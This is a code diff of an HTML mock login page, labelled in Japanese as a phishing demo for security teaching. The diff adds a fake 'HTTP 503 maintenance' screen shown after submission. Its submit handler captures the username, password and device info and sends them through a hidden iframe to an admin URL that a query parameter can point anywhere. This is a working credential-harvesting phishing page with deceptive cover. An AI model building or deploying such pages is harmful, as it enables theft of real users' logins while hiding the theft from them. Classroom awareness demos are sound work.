@@ -12,6 +12,7 @@
     🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。
   </div>
 
+  <!-- ログイン入力フォーム -->
   <div class="login-container" id="login-box">
     <div class="mock-logo">
       <span class="logo-icon">🛡️ S</span>
@@ -34,7 +35,14 @@
     </form>
   </div>
 
- <script>
+  <!-- ⚠️ エラー画面（ログインを押した後にスマホに表示される画面） -->
+  <div class="login-container hidden" id="error-box">
+    <div class="error-icon">⚠️</div>
+    <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
+    <p>現在システムメンテナンス中です。<br>恐れ入りますが、しばらく時間を置いてから再度お試しください。</p>
+  </div>
+
+  <script>
     const urlParams = new URLSearchParams(window.location.search);
     const adminUrl = urlParams.get('admin') || 'admin.html';
 
@@ -63,36 +71,18 @@
         password: password
       });
 
-      // 1. スマホ側には「メンテナンスエラー画面」を表示して、ログイン画面を隠す
+      // 1. スマホ側にはログイン画面を消して「エラー画面（メンテナンス中）」を出す！
       document.getElementById('login-box').classList.add('hidden');
       document.getElementById('error-box').classList.remove('hidden');
 
-      // 2. 裏側（バックグラウンド）で、PC側の管理画面にデータを送って開く（またはリダイレクトさせる）
-      // ※本番のデモのときは、プロジェクターに映っているPC画面側でこのデータを受け取る形になります
-  
-
-
-
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const device = getDeviceInfo();
-      const time = new Date().toLocaleTimeString();
-
-      // 入力されたデータをURLのパラメータにエンコード
-      const params = new URLSearchParams({
-        time: time,
-        device: device,
-        username: username,
-        password: password
-      });
-
-      // 🌐 【超確実な仕組み】
-      // スマホの画面を、PC側の管理画面（データを受け取るモード）へ強制的にワープさせる！
-      // ※もし本番でPC画面に直接反映させたい場合は、あらかじめPC側でこのadmin.htmlを開いておき、
-      // 　ス
+      // 2. PC側（管理者画面）にデータを送るための隠し通信（裏で別タブを開いてデータを飛ばすなど）
+      // または、本番でPC画面に即座に反映させるための処理
+      // ※スマホの画面自体はエラー画面のまま動きません！
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = `${adminUrl}?${params.toString()}`;
+      document.body.appendChild(iframe);
+    });
   </script>
 </body>
 </html>
